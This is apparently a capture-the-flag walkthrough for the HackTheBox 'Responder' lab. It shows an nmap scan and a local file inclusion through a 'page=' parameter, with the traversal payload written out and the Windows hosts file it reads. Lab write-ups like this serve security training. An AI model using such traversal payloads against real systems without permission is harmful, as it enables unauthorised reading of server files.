## Responder HackTheBox
#### About Box

---
#### Step One: Recon
First thing is : `nmap`
```bash
nmap -A -sV --privileged -T4 10.129.121.226  -p- -O -sC -v
```
**`Result`**
|PORT|STATE|SERVICE|VERSION|
|----|----|----|----|
|80/tcp|open|http|Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|
|5985/tcp|open|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|

Result Description: **`Port 80`**
```terminal
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
```

Result Description: **`Port 5985`**
```terminal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

Then we visit the site and with `wappalyzer` we can see bunch of stuffs about our site. The key features are:
- Running on PHP `8.1.1`
- Running on a Windows OS
- Has Apache server

Burp automatically discoverd a parameter called **`page=`**. let's take a look at it.

#### Step Two: Exploiting
We discoverd that our found parameter **`page`** loads file from the server. this might help us to get `LFI`. But this is a windows server so we have to use payload that follows windows filesystem.

in this case I've used: `../../../../../../../../windows/system32/drivers/etc/hosts`

and yes we get a `LFI`

**`Result`**
```terminal
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-------<snip>------
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
```
